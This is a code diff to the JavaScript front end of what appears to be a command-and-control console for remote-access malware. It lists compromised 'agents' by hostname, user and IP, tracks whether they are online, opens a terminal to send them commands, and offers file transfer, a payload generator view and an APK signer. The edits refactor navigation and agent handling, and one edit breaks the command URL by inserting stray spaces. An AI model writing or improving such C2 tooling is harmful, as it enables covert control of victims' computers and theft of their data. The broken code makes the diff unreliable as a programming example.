@@ -32,21 +32,34 @@ document.addEventListener('DOMContentLoaded', () => {
 function initializeEventListeners() {
     // Navigation
     document.querySelectorAll('.nav-item').forEach(item => {
-        item.addEventListener('click', (e) => {
-            const view = e.currentTarget.dataset.view;
+        item.addEventListener('click', () => {
+            const view = item.dataset.view;
             switchView(view);
+
+            // Update active nav item
+            document.querySelectorAll('.nav-item').forEach(nav => nav.classList.remove('active'));
+            item.classList.add('active');
         });
     });
 
-    // Connection
+    // Connect button
     document.getElementById('connectBtn').addEventListener('click', connectToC2);
 
-    // Agents
+    // Refresh agents
     document.getElementById('refreshAgentsBtn').addEventListener('click', loadAgents);
 
-    // Terminal
+    // Agent selection in terminal
     document.getElementById('agentSelect').addEventListener('change', (e) => {
         selectedAgentId = e.target.value;
+        if (selectedAgentId && term) {
+            term.clear();
+            const agent = agents.find(a => a.agent_id === selectedAgentId);
+            if (agent) {
+                term.writeln(`[*] Connected to ${agent.hostname} (${agent.platform})`);
+                term.writeln('');
+                term.write('$ ');
+            }
+        }
     });
     document.getElementById('clearTerminal').addEventListener('click', () => {
         term.clear();
@@ -66,12 +79,6 @@ function initializeEventListeners() {
     document.getElementById('uploadBtn').addEventListener('click', uploadFile);
     document.getElementById('downloadBtn').addEventListener('click', downloadFile);
 
-    // Payload Generator
-    document.getElementById('payloadForm').addEventListener('submit', (e) => {
-        e.preventDefault();
-        generatePayload();
-    });
-
     // Tools
     document.getElementById('sslGenBtn').addEventListener('click', () => runTool('ssl_gen'));
     document.getElementById('apkSignerBtn').addEventListener('click', () => runTool('apk_signer'));
@@ -86,31 +93,33 @@ function initializeEventListeners() {
 //============================================================================
 
 function switchView(viewName) {
-    // Update nav items
-    document.querySelectorAll('.nav-item').forEach(item => {
-        item.classList.remove('active');
-        if (item.dataset.view === viewName) {
-            item.classList.add('active');
-        }
-    });
+    // Hide all views
+    document.querySelectorAll('.view').forEach(view => view.classList.remove('active'));
+    document.querySelectorAll('.content-section').forEach(section => section.style.display = 'none');
 
-    // Update views
-    document.querySelectorAll('.view').forEach(view => {
-        view.classList.remove('active');
-    });
-    document.getElementById(`${viewName}View`).classList.add('active');
+    // Show selected view
+    const viewElement = document.getElementById(`${viewName}View`);
+    const sectionElement = document.getElementById(`${viewName}-section`);
 
-    // Update title
+    if (viewElement) {
+        viewElement.classList.add('active');
+    }
+    if (sectionElement) {
+        sectionElement.style.display = 'block';
+    }
+
+    // Update header title
     const titles = {
-        dashboard: 'Dashboard',
-        agents: 'Agents',
-        terminal: 'Terminal',
-        files: 'File Transfer',
-        payload: 'Payload Generator',
-        tools: 'Tools',
-        settings: 'Settings'
+        'dashboard': 'Dashboard',
+        'agents': 'Agents',
+        'terminal': 'Terminal',
+        'files': 'File Transfer',
+        'payload': 'Payload Generator',
+        'tools': 'Tools',
+        'settings': 'Settings'
     };
-    document.getElementById('viewTitle').textContent = titles[viewName];
+
+    document.getElementById('viewTitle').textContent = titles[viewName] || viewName;
 
     // Load data if needed
     if (viewName === 'agents' && connected) {
@@ -130,6 +139,10 @@ async function connectToC2() {
     }
 
     c2ServerURL = serverInput;
+
+    // Save C2 server address to localStorage
+    localStorage.setItem('c2Server', c2ServerURL);
+
     logActivity(`Connecting to ${c2ServerURL}...`);
 
     try {
@@ -206,7 +219,10 @@ function startPolling() {
 //============================================================================
 
 async function loadAgents() {
-    if (!connected) return;
+    if (!connected) {
+        showNotification('Error', 'Not connected to C2 server');
+        return;
+    }
 
     try {
         const https = require('https');
@@ -215,44 +231,64 @@ async function loadAgents() {
         });
 
         const response = await axios.get(`${c2ServerURL}/api/agents`, {
-            headers: { 'Authorization': `Bearer ${authToken}` },
+            headers: {
+                'Authorization': `Bearer ${authToken}`
+            },
             httpsAgent: httpsAgent
         });
 
         agents = response.data.agents || [];
-        updateAgentsTable(agents);
-        updateAgentSelects(agents);
-        updateStats();
+        renderAgentsTable();
+        updateAgentSelectors();
+
+        // Update dashboard stats (only count online agents)
+        const onlineAgents = agents.filter(isAgentOnline).length;
+        document.getElementById('activeAgentsCount').textContent = onlineAgents;
+
     } catch (error) {
         logActivity(`Failed to load agents: ${error.message}`, 'error');
     }
 }
 
-function updateAgentsTable(agentsList) {
+function isAgentOnline(agent) {
+    if (!agent.last_seen) return false;
+    const lastSeen = new Date(agent.last_seen);
+    const now = new Date();
+    const diffSeconds = (now - lastSeen) / 1000;
+    return diffSeconds < 30; // Online if seen within last 30 seconds
+}
+
+function renderAgentsTable() {
     const tbody = document.getElementById('agentsTableBody');
 
-    if (agentsList.length === 0) {
-        tbody.innerHTML = '<tr><td colspan="7" class="no-data">No agents connected</td></tr>';
+    if (agents.length === 0) {
+        tbody.innerHTML = '<tr><td colspan="7" class="no-data">No agents connected. Waiting for checkins...</td></tr>';
         return;
     }
 
-    tbody.innerHTML = agentsList.map(agent => `
+    tbody.innerHTML = agents.map(agent => {
+        const online = isAgentOnline(agent);
+        const statusBadge = online
+            ? '<span class="status-badge online">🟢 Online</span>'
+            : '<span class="status-badge offline">🔴 Offline</span>';
+
+        return `
         <tr>
             <td><code>${agent.agent_id.substring(0, 8)}</code></td>
             <td>${agent.hostname || 'N/A'}</td>
             <td>${agent.username || 'N/A'}</td>
             <td>${agent.platform || 'N/A'}</td>
             <td>${agent.ip_address || 'N/A'}</td>
-            <td>${formatTime(agent.last_seen)}</td>
+            <td>${statusBadge} ${formatTime(agent.last_seen)}</td>
             <td>
-                <button class="btn btn-sm" onclick="selectAgent('${agent.agent_id}')">Select</button>
-                <button class="btn btn-sm" onclick="sendCommand('${agent.agent_id}')">Command</button>
+                <button class="btn btn-sm" onclick="selectAgent('${agent.agent_id}')">Terminal</button>
             </td>
         </tr>
-    `).join('');
+    `;
+    }).join('');
 }
 
-function updateAgentSelects(agentsList) {
+function updateAgentSelectors() {
     const selects = ['agentSelect', 'uploadAgentSelect', 'downloadAgentSelect'];
 
     selects.forEach(selectId => {
@@ -260,7 +296,7 @@ function updateAgentSelects(agentsList) {
         if (!select) return;
 
         select.innerHTML = '<option value="">Select an agent...</option>' +
-            agentsList.map(agent =>
+            agents.map(agent =>
                 `<option value="${agent.agent_id}">${agent.hostname} (${agent.platform})</option>`
             ).join('');
     });
@@ -289,7 +325,7 @@ async function sendCommand(agentId, command) {
         });
 
         const response = await axios.post(
-            `${c2ServerURL}/api/agents/${agentId}/command`,
+            `${c2ServerURL} /api/agents / ${agentId}/command`,
             { command },
             {
                 headers: { 'Authorization': `Bearer ${authToken}` },
@@ -539,6 +575,7 @@ function saveSettings() {
     };
 
     localStorage.setItem('rampSettings', JSON.stringify(settings));
+    localStorage.setItem('c2Server', document.getElementById('c2ServerInput').value); // Save current C2 server
     logActivity('Settings saved');
     showNotification('Success', 'Settings saved successfully');
 }
